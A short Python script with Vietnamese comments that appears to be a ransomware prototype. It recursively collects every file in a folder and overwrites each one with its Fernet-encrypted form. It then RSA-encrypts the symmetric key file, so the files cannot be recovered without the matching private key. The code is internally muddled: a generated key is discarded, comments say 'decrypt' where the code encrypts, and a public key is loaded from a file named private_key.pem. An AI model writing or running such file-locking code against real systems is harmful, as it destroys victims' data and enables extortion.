import os
from cryptography.fernet import Fernet as cryp
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

def readkey():
    # Đọc khóa riêng từ file
    with open(r"C:\Users\PC\OneDrive\Máy tính\Python (1)\private_key.pem", "rb") as public_key_file:
        public_key = serialization.load_pem_public_key(public_key_file.read())
        return public_key


def encryp_data(link_path,private_key):
    # Giải mã dữ liệu bằng khóa riêng
    with open(link_path,"rb") as read:
        data = read.read()
        encrypted_data = private_key.encrypt(
        data,padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))

    with open(link_path,"wb") as write:
             write.write(encrypted_data)
    print("Dữ liệu đã được mã hoa:", link_path)


def find_file(link_path):
    for file in os.listdir(link_path):
        newlink=os.path.join(link_path,file)
        if os.path.isfile(newlink):
            files.append(newlink)
        else :
            find_file(newlink)



def encryp_file(key,files):
    for file in files:
        try:
            with open(file,"rb") as read:
                encrypted_data=cryp(key).encrypt(read.read())
            with open(file,"wb") as write:
                write.write(encrypted_data)
        except:
            print(file)


files=[]
link_folder=r"C:\Users\PC\OneDrive\Máy tính\Python (1)\test"
link_key=r"C:\Users\PC\OneDrive\Máy tính\Python (1)\key.key"


find_file(link_folder)
key=cryp.generate_key()
with open(r"C:\Users\PC\OneDrive\Máy tính\Python (1)\key.key","rb") as thekey:
    key=thekey.read()
encryp_file(key,files)
private_key=readkey()
encryp_data(link_key,private_key)
